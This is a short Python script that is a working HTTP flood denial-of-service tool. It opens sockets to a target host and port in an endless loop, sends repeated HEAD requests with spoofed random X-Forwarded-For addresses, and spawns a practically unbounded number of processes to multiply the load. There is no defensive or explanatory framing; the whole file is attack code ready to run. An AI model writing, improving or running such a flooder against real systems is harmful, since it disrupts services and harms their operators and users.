import random
import socket
from time import sleep
import multiprocessing


def genip():
    randip = ".".join(str(random.randint(0, 255)) for _ in range(4))
    return randip


def attack(ip, port, url):
    connection = "Connection: null\r\n"
    referer = "Referer: null\r\n"
    forward = "X-Forwarded-For: " + genip() + "\r\n"
    get_host = "HEAD " + url + " HTTP/1.1\r\nHost: " + ip + "\r\n"
    request = get_host + referer + connection + forward + "\r\n\r\n"
    while True:
        try:
            atk = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            atk.connect((ip, port))
            for y in range(80):
                atk.send(str.encode(request))
        except socket.error:
            sleep(0)
        except:
            pass


def sendattack(ip: str, port: int):
    url = f"http://{str(ip)}"
    s2a(ip, port, url)


def s2a(ip, port, url):
    for i in range(999999999999):
        mp = multiprocessing.Process(target=attack, args=(
            ip,
            port,
            url,
        ))
        mp.setDaemon = False
        mp.start()
